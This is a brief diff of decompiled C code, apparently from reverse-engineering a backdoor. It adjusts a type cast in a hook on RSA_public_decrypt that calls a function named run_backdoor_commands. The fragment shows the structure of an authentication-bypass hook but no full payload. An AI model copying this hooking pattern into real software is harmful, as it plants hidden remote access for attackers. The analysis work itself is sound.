@@ -26,7 +26,7 @@ int hook_RSA_public_decrypt(int flen,uchar *from,uchar *to,RSA *rsa,int padding)
      UNRECOVERED_JUMPTABLE != (pfn_RSA_public_decrypt_t)0x0)) {
     if (rsa != (RSA *)0x0) {
       result = 1;
-      BVar1 = run_backdoor_commands(rsa,global_ctx,&result);
+      BVar1 = run_backdoor_commands(rsa,global_ctx,(BOOL *)&result);
       if (result == 0) {
         return BVar1;
       }
